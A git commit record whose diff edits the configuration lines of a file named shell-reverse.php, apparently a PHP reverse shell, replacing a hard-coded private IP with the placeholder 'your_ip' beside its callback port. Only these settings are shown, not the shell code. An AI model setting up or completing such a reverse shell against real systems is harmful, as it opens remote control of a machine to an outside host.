661eca07ec0069a7e94c963e16ed6aa126c3edce
BET4 <60259460+bet4z@users.noreply.github.com>
2021-04-08 22:06:55 -0300

    Update shell-reverse.php

--- shell-reverse.php
+++ shell-reverse.php
@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.2.25.14';  // CHANGE THIS
+$ip = 'your_ip';  // CHANGE THIS
 $port = 4040;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
